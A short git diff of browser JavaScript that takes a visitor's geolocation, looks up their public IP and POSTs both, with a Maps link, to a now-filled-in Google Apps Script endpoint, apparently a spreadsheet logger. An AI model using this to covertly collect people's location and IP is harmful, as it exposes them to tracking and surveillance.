@@ -30,15 +30,13 @@
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      // Captura o IP
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
           const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-          // Envia os dados para a planilha
-          fetch('SEU_LINK_DO_WEBAPP_AQUI', {
+          fetch('https://script.google.com/macros/s/AKfycbxf2zJWjwQ_Y0q4zH2S-2qKEXoUmhos5wXCHtUviNKwoyhYklzSyrbxsavtt0M89vw4/exec', {
             method: 'POST',
             mode: 'no-cors',
             headers: {
